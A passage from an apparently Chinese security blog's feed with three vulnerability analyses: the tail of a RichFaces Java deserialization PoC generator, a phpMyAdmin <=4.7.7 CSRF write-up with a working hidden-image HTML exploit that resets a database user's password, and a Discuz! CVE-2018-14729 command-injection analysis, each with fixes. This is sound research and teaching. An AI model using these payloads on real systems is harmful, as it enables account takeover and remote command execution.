class="line"></span><br><span class="line">        <span class="comment">// 2. 序列化</span></span><br><span class="line">        UserResource.UriData uriData = <span class="keyword">new</span> UserResource.UriData();</span><br><span class="line"></span><br><span class="line">        Field valueField = uriData.getClass().getDeclaredField(<span class="string">"value"</span>);</span><br><span class="line">        valueField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valueField.set(uriData, value);</span><br><span class="line"></span><br><span class="line">        Field createContentField = uriData.getClass().getDeclaredField(<span class="string">"createContent"</span>);</span><br><span class="line">        createContentField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        createContentField.set(uriData, createContent);</span><br><span class="line"></span><br><span class="line">        Field expiresField = uriData.getClass().getDeclaredField(<span class="string">"expires"</span>);</span><br><span class="line">        expiresField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        expiresField.set(uriData, expires);</span><br><span class="line"></span><br><span class="line">        Field modifiedField = uriData.getClass().getDeclaredField(<span class="string">"modified"</span>);</span><br><span class="line">        modifiedField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        modifiedField.set(uriData, modified);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(uriData);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        byteArrayOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 加密（zip+base64）</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">byte</span>[] pocData = byteArrayOutputStream.toByteArray();</span><br><span class="line">        Deflater compressor = <span class="keyword">new</span> Deflater(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] compressed = <span class="keyword">new</span> <span class="keyword">byte</span>[pocData.length + <span class="number">100</span>];</span><br><span class="line">        compressor.setInput(pocData);</span><br><span class="line">        compressor.finish();</span><br><span class="line">        <span class="keyword">int</span> totalOut = compressor.deflate(compressed);</span><br><span class="line">        <span class="keyword">byte</span>[] zipsrc = <span class="keyword">new</span> <span class="keyword">byte</span>[totalOut];</span><br><span class="line">        System.arraycopy(compressed, <span class="number">0</span>, zipsrc, <span class="number">0</span>, totalOut);</span><br><span class="line">        compressor.end();</span><br><span class="line">        <span class="keyword">byte</span>[]dataArray = URL64Codec.encodeBase64(zipsrc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 打印最后的poc</span></span><br><span class="line">        String poc = <span class="string">"/DATA/"</span> + <span class="keyword">new</span> String(dataArray, <span class="string">"ISO-8859-1"</span>) + <span class="string">".jsf"</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15434804781184.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://tint0.com/when-el-injection-meets-java-deserialization/" target="_blank" rel="noopener">https://tint0.com/when-el-injection-meets-java-deserialization/</a></li><li><a href="https://xz.aliyun.com/t/3264" target="_blank" rel="noopener">https://xz.aliyun.com/t/3264</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚开始分析Java的漏洞，很多东西感觉还是有待学习…&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="RichFaces" scheme="https://lucifaer.com/tags/RichFaces/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin &lt;= 4.7.7 CSRF分析</title>
    <link href="https://lucifaer.com/2018/08/30/phpMyAdmin%20%3C=%204.7.7%20CSRF%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/08/30/phpMyAdmin &lt;= 4.7.7 CSRF分析/</id>
    <published>2018-08-30T12:01:00.000Z</published>
    <updated>2018-08-30T12:01:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>同样也是一个鸡肋漏洞，产生原因在<code>Common.inc.php</code>核心类，感觉漏洞发现者是捡了一个漏洞…</p><a id="more"></a><h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>本周在Twitter上有一个较为热点的讨论话题，是有关phpMyAdmin &lt;=4.7.7版本的一个CSRF漏洞，漏洞存在于<code>common.inc.php</code>中，而笔者分析完后，发现这个更像是漏洞作者捡漏的一个漏洞。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>phpMyAdmin &lt;= 4.7.7</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>本文用phpMyAdmin 4.7.6进行分析。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>直接看漏洞本质，主要在于两个点：</p><p>首先是位于<code>libraries/common.inc.php</code>中第375行到389行这一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PMA_isValid($_POST[<span class="string">'token'</span>])) &#123;</span><br><span class="line">        $token_provided = <span class="keyword">true</span>;</span><br><span class="line">        $token_mismatch = ! @hash_equals($_SESSION[<span class="string">' PMA_token '</span>], $_POST[<span class="string">'token'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($token_mismatch) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * We don't allow any POST operation parameters if the token is mismatched</span></span><br><span class="line"><span class="comment">         * or is not provided</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $whitelist = <span class="keyword">array</span>(<span class="string">'ajax_request'</span>);</span><br><span class="line">        PMA\libraries\Sanitize::removeRequestVars($whitelist);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个关键点：如果发送的请求是<code>GET</code>请求，就可以绕过对于参数的检测。</p><p>其次，第二个漏洞触发的关键点在<code>sql.php</code>第72行到76行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这边可以直接接受外部<code>GET</code>请求的参数，在190行到199行处直接执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($goto == <span class="string">'sql.php'</span>) &#123;</span><br><span class="line">    $is_gotofile = <span class="keyword">false</span>;</span><br><span class="line">    $goto = <span class="string">'sql.php'</span> . URL::getCommon(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'db'</span> =&gt; $db,</span><br><span class="line">            <span class="string">'table'</span> =&gt; $table,</span><br><span class="line">            <span class="string">'sql_query'</span> =&gt; $sql_query</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>如上所说，我们只需要构造一个页面该页面在用户点击的时候自动发一个<code>GET</code>请求就ok了。</p><p>我在漏洞利用这边举一个利用csrf修改当前用户密码的例子。</p><p>构造一个HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>POC TEST<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://localhost:8888/sql.php?db=mysql&amp;table=user&amp;sql_query=SET password = PASSWORD('vul_test')"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后诱导已经登录phpMyAdmin的用户访问，当前用户的密码就已经改为<code>vul_test</code>了。</p><h1 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h1><p>最简单的修补方式就是将<code>sql.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_GET[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_GET[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'bkm_fields'</span>][<span class="string">'bkm_sql_query'</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($_POST[<span class="string">'sql_query'</span>])) &#123;</span><br><span class="line">    $sql_query = $_POST[<span class="string">'sql_query'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，直接更新到最新版是更好的方法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;同样也是一个鸡肋漏洞，产生原因在&lt;code&gt;Common.inc.php&lt;/code&gt;核心类，感觉漏洞发现者是捡了一个漏洞…&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)</title>
    <link href="https://lucifaer.com/2018/08/29/Discuz!%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2018-14729)/"/>
    <id>https://lucifaer.com/2018/08/29/Discuz! 1.5-2.5 命令执行漏洞分析(CVE-2018-14729)/</id>
    <published>2018-08-29T08:48:09.000Z</published>
    <updated>2018-11-29T09:43:38.814Z</updated>
    
    <content type="html"><![CDATA[<p>鸡肋的漏洞，不过官方的解决方案也是有点意思…</p><a id="more"></a><h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>8月27号有人在<a href="https://github.com/FoolMitAh/CVE-2018-14729" target="_blank" rel="noopener">GitHub</a>上公布了有关<code>Discuz 1.5-2.5版本</code>中后台数据库备份功能存在的命令执行漏洞的细节。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Discuz! 1.5-2.5</p><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>官方论坛下载相应版本就好。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>需要注意的是这个漏洞其实是需要登录后台的，并且能有数据库备份权限，所以比较鸡肋。</p><p>我这边是用<code>Discuz! 2.5</code>完成漏洞复现的，并用此进行漏洞分析的。</p><p>漏洞点在：<code>source/admincp/admincp_db.php</code>第296行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@shell_exec($mysqlbin.<span class="string">'mysqldump --force --quick '</span>.($db-&gt;version() &gt; <span class="string">'4.1'</span> ? <span class="string">'--skip-opt --create-options'</span> : <span class="string">'-all'</span>).<span class="string">' --add-drop-table'</span>.($_GET[<span class="string">'extendins'</span>] == <span class="number">1</span> ? <span class="string">' --extended-insert'</span> : <span class="string">''</span>).<span class="string">''</span>.($db-&gt;version() &gt; <span class="string">'4.1'</span> &amp;&amp; $_GET[<span class="string">'sqlcompat'</span>] == <span class="string">'MYSQL40'</span> ? <span class="string">' --compatible=mysql40'</span> : <span class="string">''</span>).<span class="string">' --host="'</span>.$dbhost.($dbport ? (is_numeric($dbport) ? <span class="string">' --port='</span>.$dbport : <span class="string">' --socket="'</span>.$dbport.<span class="string">'"'</span>) : <span class="string">''</span>).<span class="string">'" --user="'</span>.$dbuser.<span class="string">'" --password="'</span>.$dbpw.<span class="string">'" "'</span>.$dbname.<span class="string">'" '</span>.$tablesstr.<span class="string">' &gt; '</span>.$dumpfile);</span><br></pre></td></tr></table></figure><p>在<code>shell_exec()</code>函数中可控点在<code>$tablesstr</code>，向上看到第281行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$tablesstr = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span>($tables <span class="keyword">as</span> $table) &#123;</span><br><span class="line">$tablesstr .= <span class="string">'"'</span>.$table.<span class="string">'" '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下<code>$table</code>的获取流程，在上面的第143行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'type'</span>] == <span class="string">'discuz'</span> || $_GET[<span class="string">'type'</span>] == <span class="string">'discuz_uc'</span>) </span><br><span class="line">&#123;</span><br><span class="line">$tables = arraykeys2(fetchtablelist($tablepre), <span class="string">'Name'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span>($_GET[<span class="string">'type'</span>] == <span class="string">'custom'</span>) </span><br><span class="line">&#123;</span><br><span class="line">$tables = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'setup'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">$tables = C::t(<span class="string">'common_setting'</span>)-&gt;fetch(<span class="string">'custombackup'</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">C::t(<span class="string">'common_setting'</span>)-&gt;update(<span class="string">'custombackup'</span>, <span class="keyword">empty</span>($_GET[<span class="string">'customtables'</span>])? <span class="string">''</span> : $_GET[<span class="string">'customtables'</span>]);</span><br><span class="line">$tables = &amp; $_GET[<span class="string">'customtables'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( !is_array($tables) || <span class="keyword">empty</span>($tables)) </span><br><span class="line">&#123;</span><br><span class="line">cpmsg(<span class="string">'database_export_custom_invalid'</span>, <span class="string">''</span>, <span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C::t(<span class="string">'common_setting'</span>)-&gt;update(<span class="string">'custombackup'</span>, <span class="keyword">empty</span>($_GET[<span class="string">'customtables'</span>])? <span class="string">''</span> : $_GET[<span class="string">'customtables'</span>]);</span><br><span class="line">$tables = &amp; $_GET[<span class="string">'customtables'</span>];</span><br></pre></td></tr></table></figure><p>首先会从<code>$_GET</code>的数组中获取<code>customtables</code>字段的内容，判断内容是否为空，不为空则将从外部获取到的<code>customtables</code>字段内容写入<code>common_setting</code>表的<code>skey=custombackup</code>的<code>svalue</code>字段，写入过程中会将这个字段做序列化存储：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355169554381.jpg" alt=""></p><p>之后再将该值赋给<code>$tables</code>。</p><p>至此可以看到漏洞产生的原因是由于<code>shell_exec()</code>中的<code>$tablesstr</code>可控，导致代码注入。</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>漏洞的调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.php-&gt;source/class/discuz/discuz_admincp.php-&gt;source/admincp/admincp_db.php</span><br></pre></td></tr></table></figure><p>跟着漏洞的调用栈看一下如何利用。</p><p>首先在<code>admin.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($action) || $frames != <span class="keyword">null</span>) &#123;</span><br><span class="line">$admincp-&gt;show_admincp_main();</span><br><span class="line">&#125; <span class="keyword">elseif</span>($action == <span class="string">'logout'</span>) &#123;</span><br><span class="line">$admincp-&gt;do_admin_logout();</span><br><span class="line">dheader(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span>(in_array($action, $admincp_actions_normal) || ($admincp-&gt;isfounder &amp;&amp; in_array($action, $admincp_actions_founder))) &#123;</span><br><span class="line"><span class="keyword">if</span>($admincp-&gt;allow($action, $operation, $do) || $action == <span class="string">'index'</span>) &#123;</span><br><span class="line"><span class="keyword">require</span> $admincp-&gt;admincpfile($action);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cpheader();</span><br><span class="line">cpmsg(<span class="string">'action_noaccess'</span>, <span class="string">''</span>, <span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">cpheader();</span><br><span class="line">cpmsg(<span class="string">'action_noaccess'</span>, <span class="string">''</span>, <span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点在构造参数满足<code>require $admincp-&gt;admincpfile($action);</code>且<code>$action</code>为<code>db</code>。也就说需要构造参数满足：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$admincp-&gt;isfounder &amp;&amp; in_array($action, $admincp_actions_founder) <span class="comment"># 为真</span></span><br><span class="line"></span><br><span class="line">$admincp-&gt;allow($action, $operation, $do) <span class="comment"># 为真</span></span><br></pre></td></tr></table></figure><p><code>$admincp-&gt;isfounder</code>是确认当前用户的，返回为True，这里只需要构造<code>$action</code>为<code>db</code>。</p><p>跟进<code>require $admincp-&gt;admincpfile($action);</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admincpfile</span><span class="params">($action)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'./source/admincp/admincp_'</span>.$action.<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就包含了<code>source/admincp/admincp_db.php</code>。跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355254512996.jpg" alt=""></p><p>这边需要满足<code>$operation == &#39;export&#39;</code>，同时存在<code>exportsubmit</code>字段。</p><p>之后，</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355255451174.jpg" alt=""></p><p>需要构造<code>file</code>字段，同时<code>$_GET[&#39;type&#39;] == &#39;custom&#39;</code>且<code>$_GET[&#39;setup&#39;]</code>和<code>$_GET[&#39;customtables&#39;]</code>非空。向下跟，还需要满足最后一个条件<code>$_GET[&#39;method&#39;] != &#39;multivol&#39;</code>，这样才能调用<code>else</code>中的操作，完成代码注入。</p><p>有了上面的这些基础分析，我们抓个符合上方条件的包来看一下。经过测试，</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355278149915.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355278323585.jpg" alt=""></p><p>这样可以抓到符合我们条件的请求包。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355271448086.jpg" alt=""></p><p>接下来只需要将<code>customtables</code>的内容更改一下就可以造成命令执行了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355276151334.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355277015025.jpg" alt=""></p><p>效果为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15355277397794.jpg" alt=""></p><h1 id="0x04-参数获取问题"><a href="#0x04-参数获取问题" class="headerlink" title="0x04 参数获取问题"></a>0x04 参数获取问题</h1><p>通过上面的分析可以看到最终可控参数的获取都是利用<code>$_GET</code>来获取的，但是我们在构造时发送的是post数据，那么为什么会照常获取到呢？</p><p>在<code>admin.php</code>第18行包含了<code>source/class/class_core.php</code>：跟进看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">C::creatapp();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">core</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creatapp</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_object(<span class="keyword">self</span>::$_app)) &#123;</span><br><span class="line"><span class="keyword">self</span>::$_app = discuz_application::instance();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::$_app;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>source/class/discuz/discuz_application.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_env();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_config();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_input();</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_output();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着跟进到<code>_init_input()</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span> &amp;&amp; !<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">$_GET = array_merge($_GET, $_POST);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到如果构造了post请求，<code>Discuz</code>的核心类会将<code>$_GET</code>和<code>$_POST</code>这两个list拼接到一起，赋给<code>$_GET</code>数组。</p><h1 id="0x05-修复方法"><a href="#0x05-修复方法" class="headerlink" title="0x05 修复方法"></a>0x05 修复方法</h1><p>可以利用<code>addslashes()</code>对可控点进行限制，同时利用<code>escapeshellarg()</code>函数来限制<code>$tablesstr</code>执行命令。</p><h1 id="0x06-Discuz-3-4的做法"><a href="#0x06-Discuz-3-4的做法" class="headerlink" title="0x06 Discuz 3.4的做法"></a>0x06 Discuz 3.4的做法</h1><p><code>Discuz 3.4</code>非常有趣的一点不是把这个漏洞修了，而是直接在<code>source/admincp/admincp_db.php</code>第307行写了一个错误…：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list</span>(, $mysql_base) = DB::fetch($query, DB::$drivertype == <span class="string">'mysqli'</span> ? MYSQLI_NUM : MYSQL_NUM);</span><br></pre></td></tr></table></figure><p>调用了一个未声明的静态变量，所以该功能直接是挂掉的，没有办法使用，可谓是简单粗暴…</p><h1 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h1><p><a href="https://github.com/FoolMitAh/CVE-2018-14729" target="_blank" rel="noopener">FoolMitAh/CVE-2018-14729</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸡肋的漏洞，不过官方的解决方案也是有点意思…&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>MySQLi Cookbook</title>
    <link href="https://lucifaer.com/2018/08/13/MySQLi%20Cookbook/"/>
    <id>https://lucifaer.com/2018/08/13/MySQLi Cookbook/</id>
